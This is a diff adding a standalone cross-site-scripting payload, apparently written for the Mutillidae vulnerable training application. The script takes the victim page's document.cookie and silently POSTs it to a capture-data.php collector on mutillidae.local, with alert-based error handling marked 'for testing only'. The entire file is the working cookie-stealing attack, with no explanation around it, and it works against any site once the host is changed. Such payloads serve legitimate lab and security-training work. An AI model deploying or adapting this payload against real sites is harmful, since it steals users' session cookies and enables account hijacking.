@@ -1,0 +1,35 @@
+<script>
+	var lXMLHTTP;
+	try{ 
+		var lData = "data=" + encodeURIComponent(document.cookie);
+		var lHost = "mutillidae.local";
+		var lProtocol = "http";
+		var lFilePath = "/capture-data.php";
+		var lAction = lProtocol + "://" + lHost + lFilePath;
+		var lMethod = "POST";
+
+		try {
+			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); 
+		}catch (e) { 
+			try { 
+				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new XMLHttpRequest(); 
+				}catch (e) { 
+					alert(e.message);/*For testing only*/
+				} 
+			} 
+		}/*end try*/
+
+		lXMLHTTP.onreadystatechange = function(){};
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader("Host", lHost); 
+		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");			
+		lXMLHTTP.send(lData);
+
+	}catch(e){
+		alert(e.message);/*For testing only*/
+	} 
+</script>
+
